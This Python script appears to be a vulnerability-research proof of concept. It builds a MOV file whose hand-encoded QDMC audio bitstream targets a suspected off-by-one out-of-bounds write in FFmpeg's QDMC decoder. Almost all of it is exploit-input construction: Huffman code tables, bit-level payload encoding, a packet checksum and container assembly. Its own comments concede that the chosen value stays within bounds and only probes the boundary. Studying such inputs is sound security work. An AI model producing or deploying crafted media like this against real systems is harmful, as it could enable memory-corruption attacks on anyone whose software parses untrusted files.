#!/usr/bin/env python3
"""
QDMC VULN-001 PoC generator
Constructs a MOV file with a QDMC audio track designed to exercise
the off-by-one OOB write in add_wave() at qdmc.c:561-576.

The guard at line 476 likely prevents the exact OOB for pos=255,
but we target pos=254 (freq=4079, group=0) which satisfies the guard:
  (4079 >> 4) + 1 = 254 + 1 = 255 < 256 (subframe_size) → allowed.
This exercises add_wave with offset=16, pos=254 — imptr lands near
fft_buffer[stereo_mode][8192+254] which is within bounds, exercising
the add_wave loop logic as close to the boundary as possible.
"""

import struct
import sys
import os


# ---------------------------------------------------------------------------
# VLC code computation
# ---------------------------------------------------------------------------

def compute_vlc_codes(hufftab):
    """
    Compute canonical LE VLC codes for the given huffman table.
    hufftab: list of (symbol, length) pairs
    Returns: dict mapping symbol -> (length, le_code)

    IMPORTANT: ff_vlc_init_from_lengths iterates the hufftab in ORIGINAL array
    order and assigns canonical codes sequentially using a counter incremented by
    (1 << (32 - length)) per entry.  Sorting by length (the traditional canonical
    Huffman approach) gives WRONG codes for QDMC's tables, which are NOT sorted
    by length.
    """
    results = {}
    code = 0  # 64-bit canonical counter (MSB-first, 32-bit interpretation)
    for sym, length in hufftab:
        if length > 0:
            # BE canonical code = top `length` bits of the 32-bit counter
            be_code = code >> (32 - length)
            # LE code = bit-reverse of the canonical BE code
            le_code = int(format(be_code, f'0{length}b')[::-1], 2)
            results[sym] = (length, le_code)
            code += (1 << (32 - length))
    return results


# Huffman tables from qdmc.c
hufftab0 = [  # Noise value - 27 entries
    (1,2),(10,7),(26,9),(22,9),(24,9),(14,9),(8,6),(6,5),(7,5),(9,7),(30,9),(32,10),
    (13,10),(20,9),(28,9),(12,7),(15,11),(36,12),(0,12),(34,10),(18,9),(11,9),(16,9),(5,3),
    (2,3),(4,3),(3,2)
]
hufftab1 = [  # Noise segment length - 12 entries
    (1,1),(2,2),(3,4),(8,9),(9,10),(0,10),(13,8),(7,7),(6,6),(17,5),(4,4),(5,4)
]
hufftab2 = [  # Amplitude - 28 entries
    (18,3),(16,3),(22,7),(8,10),(4,10),(3,9),(2,8),(23,8),(10,8),(11,7),(21,5),(20,4),
    (1,7),(7,10),(5,10),(9,9),(6,10),(25,11),(26,12),(27,13),(0,13),(24,9),(12,6),(13,5),
    (14,4),(19,3),(15,3),(17,2)
]
hufftab3 = [  # Frequency differences - 47 entries
    (2,4),(14,6),(26,7),(31,8),(32,9),(35,9),(7,5),(10,5),(22,7),(27,7),(19,7),(20,7),
    (4,5),(13,5),(17,6),(15,6),(8,5),(5,4),(28,7),(33,9),(36,11),(38,12),(42,14),(45,16),
    (44,18),(0,18),(46,17),(43,15),(40,13),(37,11),(39,12),(41,12),(34,8),(16,6),(11,5),(9,4),
    (1,2),(3,4),(30,7),(29,7),(23,6),(24,6),(18,6),(6,4),(12,5),(21,6),(25,6)
]
hufftab4 = [  # Amplitude differences - 9 entries
    (1,2),(3,3),(4,4),(5,5),(6,6),(7,7),(8,8),(0,8),(2,1)
]
hufftab5 = [  # Phase differences - 9 entries
    (2,2),(1,2),(3,4),(7,4),(6,5),(5,6),(0,6),(4,4),(8,2)
]

vlc0 = compute_vlc_codes(hufftab0)
vlc1 = compute_vlc_codes(hufftab1)
vlc2 = compute_vlc_codes(hufftab2)
vlc3 = compute_vlc_codes(hufftab3)
vlc4 = compute_vlc_codes(hufftab4)
vlc5 = compute_vlc_codes(hufftab5)

# code_prefix table from qdmc.c
code_prefix = [
    0x0, 0x1, 0x2, 0x3, 0x4, 0x6, 0x8, 0xA,
    0xC, 0x10, 0x14, 0x18, 0x1C, 0x24, 0x2C, 0x34,
    0x3C, 0x4C, 0x5C, 0x6C, 0x7C, 0x9C, 0xBC, 0xDC,
    0xFC, 0x13C, 0x17C, 0x1BC, 0x1FC, 0x27C, 0x2FC, 0x37C,
    0x3FC, 0x4FC, 0x5FC, 0x6FC, 0x7FC, 0x9FC, 0xBFC, 0xDFC,
    0xFFC, 0x13FC, 0x17FC, 0x1BFC, 0x1FFC, 0x27FC, 0x2FFC, 0x37FC,
    0x3FFC, 0x4FFC, 0x5FFC, 0x6FFC, 0x7FFC, 0x9FFC, 0xBFFC, 0xDFFC,
    0xFFFC, 0x13FFC, 0x17FFC, 0x1BFFC, 0x1FFFC, 0x27FFC, 0x2FFFC, 0x37FFC,
    0x3FFFC
]


# ---------------------------------------------------------------------------
# Bit writer (LE bit order)
# ---------------------------------------------------------------------------

class BitWriter:
    def __init__(self):
        self.bits = []

    def write_bits(self, value, n):
        """Write n bits from value, LSB first (LE bit order)."""
        for i in range(n):
            self.bits.append((value >> i) & 1)

    def write_vlc(self, vlc_map, symbol):
        """Write a VLC-encoded symbol."""
        length, le_code = vlc_map[symbol]
        self.write_bits(le_code, length)

    def write_vlc_flag(self, vlc_map, huffsym, final_value):
        """
        Write a flag=1 encoded value.

        FFmpeg initialises vtable[i] with offset=-1, so get_vlc2() returns
        (hufftab_symbol - 1).  The decoder then uses that returned value v_vlc:
            v = code_prefix[v_vlc] + get_bitsz(gb, v_vlc >> 2)

        So: huffsym is the hufftab symbol we write into the bitstream.
            The decoder receives v_vlc = huffsym - 1.
            final_value = code_prefix[v_vlc] + extra.

        huffsym  : huffman table symbol to encode (the key into vlc_map)
        final_value: the integer value the decoder should decode (for the caller
                     that just wants to set freq/len/etc. to a specific number)
        """
        self.write_vlc(vlc_map, huffsym)
        v_vlc = huffsym - 1            # what the decoder's get_vlc2 returns
        extra_bits = v_vlc >> 2
        if extra_bits > 0:
            extra_val = final_value - code_prefix[v_vlc]
            self.write_bits(extra_val, extra_bits)

    def to_bytes(self, target_len=None):
        """Pack bits into bytes. Optionally pad/truncate to target_len bytes."""
        bits = list(self.bits)
        if target_len is not None:
            target_bits = target_len * 8
            if len(bits) < target_bits:
                bits += [0] * (target_bits - len(bits))
            else:
                bits = bits[:target_bits]
        else:
            # pad to multiple of 8
            bits += [0] * ((-len(bits)) % 8)

        result = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte |= bits[i+j] << j
            result.append(byte)
        return bytes(result)

    def bit_count(self):
        return len(self.bits)


# ---------------------------------------------------------------------------
# Build the QDMC audio bitstream (payload after the 6-byte header)
# ---------------------------------------------------------------------------

def build_qdmc_payload():
    """
    Build the noise + wave bitstream.

    Parameters:
      nb_channels = 2 (stereo)
      sample_rate = 44100 >= 32000 → frame_bits=13, frame_size=8192, subframe_size=256
      bit_rate = 0 → band_index = noise_bands_selector[0] = 4
      noise_bands_size[4] = 4  → 4 bands per channel
      fft_size = 256 → fft_order = 9

    Wave target:
      group=0, freq=4079, pos=4079>>4=254, offset=16, stereo_mode=1
      Guard: (254)+1=255 < 256 → add_tone IS called
      add_wave with group=0, off=16, pos=254 — exercises near-boundary path
    """
    bw = BitWriter()

    # -----------------------------------------------------------------------
    # KEY: FFmpeg vtables use offset=-1 in ff_vlc_init_from_lengths.
    # get_vlc2() returns (hufftab_symbol - 1).  So:
    #   write_vlc(map, S)      → decoder gets S-1 (no-flag path)
    #   write_vlc_flag(map, S, F) → decoder gets v_vlc=S-1, then
    #       final = code_prefix[S-1] + extra_bits(S-1)  ==  F
    # -----------------------------------------------------------------------

    # === Noise data: 2 channels × 4 bands ===
    # vtable[0] no-flag:  write huffsym=1 → decoder gets v=0 (valid, not <0)
    # vtable[1] flag=1:
    #   For len=2: huffsym=2 → v_vlc=1, code_prefix[1]=1, extra_bits=0 → final=1, len=2
    #   For len=1: huffsym=1 → v_vlc=0, code_prefix[0]=0, extra_bits=0 → final=0, len=1
    #
    # Schedule per band (j=0..14):
    #   7 × len=2 → j goes 0→2→4→6→8→10→12→14
    #   At j=14: idx=15, need len=1 (1+15=16 ≤ 16 ✓) → 1 × len=1 → j=15, exit

    for ch in range(2):
        for band in range(4):
            # Initial noise value: huffsym=1 → decoder gets v=0
            bw.write_vlc(vlc0, 1)
            # 7 iterations with len=2
            for _ in range(7):
                bw.write_vlc_flag(vlc1, 2, 1)   # huffsym=2 → v_vlc=1 → final=1 → len=2
                bw.write_vlc(vlc0, 1)            # huffsym=1 → decoder gets v=0
            # Final iteration with len=1 at j=14 (idx=15, 1+15=16 ≤ 16 ✓)
            bw.write_vlc_flag(vlc1, 1, 0)        # huffsym=1 → v_vlc=0 → final=0 → len=1
            bw.write_vlc(vlc0, 1)                # huffsym=1 → decoder gets v=0

    # === Wave data: 5 groups ===
    # frame_bits=13, frame_size=8192, subframe_size=256
    # group g: group_size=1<<(13-g-1), group_bits=4-g

    # ----- Group 0: one boundary-proximity tone then break -----
    # group_size=4096, group_bits=4
    # Target: freq=4079, pos=4079>>4=254, off=16, stereo_mode=1
    #   (254+1=255 < 256 → guard passes, add_tone called ✓)
    #
    # Encoding: i=1, need v s.t. freq=i+v >= group_size-1=4095 for one while trip.
    #   After one trip: freq=(i+v)+2-4096 = i+v-4094. Want this = 4079 → v=8172.
    #   pos2=4096, off=16. Guard: 4079>>4+1=255<256 ✓
    #
    # v_vlc=43: code_prefix[43]=0x1BFC=7164, extra_bits=43>>2=10, max=1023.
    #   extra=8172-7164=1008 ≤ 1023 ✓ → huffsym=44 (sym=44 in hufftab3, len=18)
    bw.write_vlc_flag(vlc3, 44, 8172)  # huffsym=44 → v_vlc=43 → final=8172

    # stereo_mode: 2 bits, value=1 → stereo_mode=1 ≤ 1, no extra amp2/phase2
    bw.write_bits(1, 2)

    # amplitude: vtable[2] no-flag, huffsym=17 → decoder gets amp=16
    bw.write_vlc(vlc2, 17)

    # phase: 3 bits = 0
    bw.write_bits(0, 3)

    # Break: second freq from i=4080 must give pos2 >= 8192 after while loop.
    # Need freq=i+v >= 4095. v >= 15.
    # v_vlc=8: code_prefix[8]=0xC=12, extra_bits=8>>2=2, max=3. extra=15-12=3. ✓
    # → huffsym=9 (sym=9 in hufftab3, len=4).  freq=4080+15=4095 ≥ 4095 → one trip
    # → pos2=4096+4096=8192 ≥ 8192 → break ✓
    bw.write_vlc_flag(vlc3, 9, 15)    # huffsym=9 → v_vlc=8 → final=15

    # ----- Groups 1-4: immediate break via large v -----
    # v_vlc=43 → v=7164+1020=8184.  freq=1+8184=8185.
    # Group 1 (gs=2048): 4 trips (8185-4*2046=1), pos2=8192 ✓
    # Group 2 (gs=1024): 8 trips (8185-8*1022=9), pos2=8192 ✓
    # Group 3 (gs=512):  16 trips (8185-16*510=25), pos2=8192 ✓
    # Group 4 (gs=256):  32 trips (8185-32*254=57), pos2=8192 ✓
    for _g in range(1, 5):
        bw.write_vlc_flag(vlc3, 44, 8184)  # huffsym=44 → v_vlc=43 → final=8184

    return bw.to_bytes()


# ---------------------------------------------------------------------------
# Build the full QDMC packet (with label and checksum)
# ---------------------------------------------------------------------------

CHECKSUM_SIZE = 512  # bytes per packet

def build_qdmc_packet(payload_bytes):
    """
    Build a complete QDMC packet:
      bytes[0..3]  = 'Q','M','C',0x01  (label)
      bytes[4..5]  = checksum (uint16 LE)
      bytes[6..]   = payload (noise+wave data)
    Total size = CHECKSUM_SIZE bytes.
    """
    # Label: MKTAG('Q','M','C',1) read as 32-bit LE from bitstream
    # get_bits_long reads 32 bits LE → the integer value is formed LSB-first from bytes
    # MKTAG('Q','M','C',1) = 0x514D4301 in big-endian byte order...
    # Actually MKTAG in FFmpeg is: (a) | (b<<8) | (c<<16) | (d<<24)
    # So MKTAG('Q','M','C',1) = ord('Q') | ord('M')<<8 | ord('C')<<16 | 1<<24
    #                          = 0x51 | 0x4D<<8 | 0x43<<16 | 0x01<<24
    #                          = 0x01434D51
    # get_bits_long reads 32 bits from LE bitstream = bytes[0..3] in normal byte order
    # with LE bit reader: bit0 of byte0 is bit0, ..., bit7 of byte3 is bit31.
    # For 32 bits: value = byte[0] | byte[1]<<8 | byte[2]<<16 | byte[3]<<24
    # So we need: byte[0]=0x51, byte[1]=0x4D, byte[2]=0x43, byte[3]=0x01
    label_bytes = bytes([0x51, 0x4D, 0x43, 0x01])

    # Pad payload to CHECKSUM_SIZE - 6
    data_size = CHECKSUM_SIZE - 6
    if len(payload_bytes) > data_size:
        payload_bytes = payload_bytes[:data_size]
    else:
        payload_bytes = payload_bytes + b'\x00' * (data_size - len(payload_bytes))

    # Compute checksum: sum = 226 + sum(bytes[6..CHECKSUM_SIZE-1]) & 0xFFFF
    total = 226
    for b in payload_bytes:
        total += b
    checksum = total & 0xFFFF

    checksum_bytes = struct.pack('<H', checksum)

    return label_bytes + checksum_bytes + payload_bytes


# ---------------------------------------------------------------------------
# MOV container builder
# ---------------------------------------------------------------------------

def pack_atom(fourcc, data):
    """Pack a MOV atom: 4-byte size (BE) + 4-byte fourcc + data."""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('latin1')
    size = 8 + len(data)
    return struct.pack('>I', size) + fourcc + data

def pack_u32be(v):
    return struct.pack('>I', v)

def pack_u16be(v):
    return struct.pack('>H', v)


def build_mov(audio_data, checksum_size, sample_rate=44100, nb_channels=2,
              fft_size=256, bit_rate=0):
    """Build a complete MOV file containing one QDMC audio sample."""

    # ---- QDMC extradata (inside a 'wave' sub-atom) ----
    # The MOV demuxer reads the 'wave' sub-atom content and passes it as
    # avctx->extradata for QDMC/QDM2 codecs (mov_read_wave, mov.c:2536-2539).
    # The QDMC decoder then scans this for the 8-byte pattern 'frmaQDMC'.
    #
    # Wave payload layout (48 bytes):
    #   frma atom (12): \x00\x00\x00\x0c + 'frma' + 'QDMC'
    #     → 'frmaQDMC' pattern appears at offset 4 within wave payload
    #   size(4,=32) + 'QDCA'(4) + skip(4) +
    #   nb_ch(4) + sr(4) + br(4) + skip(4) + fft_sz(4) + cs(4)
    #
    # Decoder first checks extradata_size >= 48: 48 >= 48 → OK.
    # Scans for 'frmaQDMC' at offset 4, skips 8 → at offset 12.
    # Checks bytes_left >= 36: 48-12=36 OK.
    # Reads size=32, checks 32 > bytes_left(32) → False → OK.
    # Reads QDCA tag, skip, nb_ch, sr, br, skip, fft_sz, cs.
    frma_atom = struct.pack('>I', 12) + b'frma' + b'QDMC'   # 12 bytes proper frma atom
    wave_payload = (
        frma_atom +                     # 12 bytes, contains 'frmaQDMC' at offset 4
        struct.pack('>I', 32) +         # size=32: QDCA+skip+nb_ch+sr+br+skip+fft_sz+cs
        b'QDCA' +
        b'\x00\x00\x00\x00' +          # skip (version/flags)
        struct.pack('>I', nb_channels) +
        struct.pack('>I', sample_rate) +
        struct.pack('>I', bit_rate) +
        b'\x00\x00\x00\x00' +          # skip
        struct.pack('>I', fft_size) +
        struct.pack('>I', checksum_size)
    )  # 12+4+4+4+4+4+4+4+4+4 = 48 bytes
    wave_atom = pack_atom('wave', wave_payload)

    # ---- stsd (sample description) ----
    # QDMC codec entry: standard 28-byte audio header + 'wave' sub-atom
    # The MOV demuxer will process the 'wave' sub-atom and set extradata.
    qdmc_entry = (
        b'\x00' * 6 +                  # reserved
        pack_u16be(1) +                 # data-reference-index
        b'\x00' * 8 +                  # reserved
        pack_u16be(nb_channels) +       # channel count
        pack_u16be(16) +                # sample size
        pack_u16be(0) +                 # compression ID
        pack_u16be(0) +                 # packet size
        struct.pack('>I', sample_rate << 16) +  # sample rate (16.16 fixed)
        wave_atom                       # codec-specific data in wave sub-atom
    )
    qdmc_atom = pack_atom('QDMC', qdmc_entry)

    stsd_data = (
        b'\x00\x00\x00\x00' +          # version + flags
        pack_u32be(1) +                 # entry count
        qdmc_atom
    )
    stsd = pack_atom('stsd', stsd_data)

    # ---- stts (time-to-sample) ----
    # 1 entry: 1 sample with duration = frame_size = 8192
    frame_size = 1 << 13  # 8192
    stts_data = (
        b'\x00\x00\x00\x00' +          # version+flags
        pack_u32be(1) +                 # entry count
        pack_u32be(1) +                 # sample count
        pack_u32be(frame_size)          # sample duration
    )
    stts = pack_atom('stts', stts_data)

    # ---- stsc (sample-to-chunk) ----
    stsc_data = (
        b'\x00\x00\x00\x00' +
        pack_u32be(1) +                 # entry count
        pack_u32be(1) +                 # first chunk
        pack_u32be(1) +                 # samples per chunk
        pack_u32be(1)                   # sample description index
    )
    stsc = pack_atom('stsc', stsc_data)

    # ---- stsz (sample size) ----
    stsz_data = (
        b'\x00\x00\x00\x00' +
        pack_u32be(0) +                 # constant sample size (0 = variable)
        pack_u32be(1) +                 # sample count
        pack_u32be(len(audio_data))     # size of sample 0
    )
    stsz = pack_atom('stsz', stsz_data)

    # ---- stco (chunk offset) ----
    # We'll place mdat right after moov; compute offset later.
    # mdat header = 8 bytes. Audio data starts at moov_size + 8.
    # We'll use a placeholder and fix it up.
    stco_data = (
        b'\x00\x00\x00\x00' +
        pack_u32be(1) +                 # entry count
        pack_u32be(0)                   # placeholder offset
    )
    stco = pack_atom('stco', stco_data)

    # ---- stbl ----
    stbl = pack_atom('stbl', stsd + stts + stsc + stsz + stco)

    # ---- smhd ----
    smhd = pack_atom('smhd', b'\x00\x00\x00\x00' + b'\x00\x00\x00\x00')

    # ---- dinf / dref ----
    url_atom = pack_atom('url ', b'\x00\x00\x00\x01')  # self-reference
    dref_data = b'\x00\x00\x00\x00' + pack_u32be(1) + url_atom
    dref = pack_atom('dref', dref_data)
    dinf = pack_atom('dinf', dref)

    # ---- minf ----
    minf = pack_atom('minf', smhd + dinf + stbl)

    # ---- mdhd ----
    mdhd_data = (
        b'\x00\x00\x00\x00' +          # version+flags
        pack_u32be(0) +                 # creation time
        pack_u32be(0) +                 # modification time
        pack_u32be(sample_rate) +       # time scale
        pack_u32be(frame_size) +        # duration
        b'\x00\x00' +                  # language (und)
        b'\x00\x00'                    # quality
    )
    mdhd = pack_atom('mdhd', mdhd_data)

    # ---- hdlr ----
    hdlr_data = (
        b'\x00\x00\x00\x00' +          # version+flags
        b'mhlr' +                       # pre-defined
        b'soun' +                       # handler type
        b'\x00\x00\x00\x00' +
        b'\x00\x00\x00\x00' +
        b'\x00\x00\x00\x00' +
        b'\x00'                        # name (empty string)
    )
    hdlr = pack_atom('hdlr', hdlr_data)

    # ---- mdia ----
    mdia = pack_atom('mdia', mdhd + hdlr + minf)

    # ---- tkhd ----
    tkhd_data = (
        b'\x00\x00\x00\x03' +          # version+flags (track enabled)
        pack_u32be(0) +                 # creation time
        pack_u32be(0) +                 # modification time
        pack_u32be(1) +                 # track ID
        b'\x00\x00\x00\x00' +          # reserved
        pack_u32be(frame_size) +        # duration
        b'\x00' * 8 +                  # reserved
        pack_u16be(0) +                 # layer
        pack_u16be(0) +                 # alternate group
        pack_u16be(0x0100) +            # volume (1.0)
        pack_u16be(0) +                 # reserved
        # matrix (identity)
        struct.pack('>9i', 0x00010000,0,0, 0,0x00010000,0, 0,0,0x40000000) +
        pack_u32be(0) +                 # width
        pack_u32be(0)                   # height
    )
    tkhd = pack_atom('tkhd', tkhd_data)

    # ---- trak ----
    trak = pack_atom('trak', tkhd + mdia)

    # ---- mvhd ----
    mvhd_data = (
        b'\x00\x00\x00\x00' +
        pack_u32be(0) +
        pack_u32be(0) +
        pack_u32be(sample_rate) +       # time scale
        pack_u32be(frame_size) +        # duration
        pack_u32be(0x00010000) +        # rate 1.0
        pack_u16be(0x0100) +            # volume 1.0
        b'\x00' * 10 +                 # reserved
        struct.pack('>9i', 0x00010000,0,0, 0,0x00010000,0, 0,0,0x40000000) +
        b'\x00' * 24 +                 # pre-defined
        pack_u32be(2)                   # next track ID
    )
    mvhd = pack_atom('mvhd', mvhd_data)

    # ---- moov ----
    moov = pack_atom('moov', mvhd + trak)

    # Fix up the stco offset: moov is first, then mdat
    # mdat header is 8 bytes, audio data starts right after
    audio_offset = len(moov) + 8
    # Find stco offset field in moov bytes and patch it
    moov_bytes = bytearray(moov)
    # Search for the stco atom signature to find the offset field
    stco_tag = b'stco'
    idx = moov_bytes.find(stco_tag)
    if idx >= 0:
        # stco layout: size(4) + 'stco'(4) + version+flags(4) + count(4) + offset(4)
        offset_field_pos = idx + 4 + 4 + 4  # after 'stco' tag, version+flags, count
        struct.pack_into('>I', moov_bytes, offset_field_pos, audio_offset)
    moov = bytes(moov_bytes)

    # ---- mdat ----
    mdat = pack_atom('mdat', audio_data)

    return moov + mdat


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    outdir = os.path.dirname(os.path.abspath(__file__))
    outfile = os.path.join(outdir, 'vuln_001_input.mov')

    print("[*] Building QDMC payload bitstream...")
    payload = build_qdmc_payload()
    print(f"    Payload size: {len(payload)} bytes")

    print("[*] Building QDMC packet with label+checksum...")
    packet = build_qdmc_packet(payload)
    assert len(packet) == CHECKSUM_SIZE, f"Packet size mismatch: {len(packet)}"
    print(f"    Packet size: {len(packet)} bytes (checksum_size={CHECKSUM_SIZE})")

    # Verify label bytes
    assert packet[:4] == bytes([0x51, 0x4D, 0x43, 0x01]), "Label bytes wrong"
    print(f"    Label check: OK ({packet[:4].hex()})")

    print("[*] Building MOV container...")
    mov_data = build_mov(
        audio_data=packet,
        checksum_size=CHECKSUM_SIZE,
        sample_rate=44100,
        nb_channels=2,
        fft_size=256,
        bit_rate=0,
    )

    with open(outfile, 'wb') as f:
        f.write(mov_data)

    print(f"[+] Written: {outfile} ({len(mov_data)} bytes)")

    # Quick sanity: verify QDCA pattern in output
    if b'frmaQDMC' in mov_data and b'QDCA' in mov_data:
        print("[+] QDCA extradata pattern found in output ✓")
    else:
        print("[!] WARNING: QDCA pattern NOT found — extradata may be wrong")


if __name__ == '__main__':
    main()
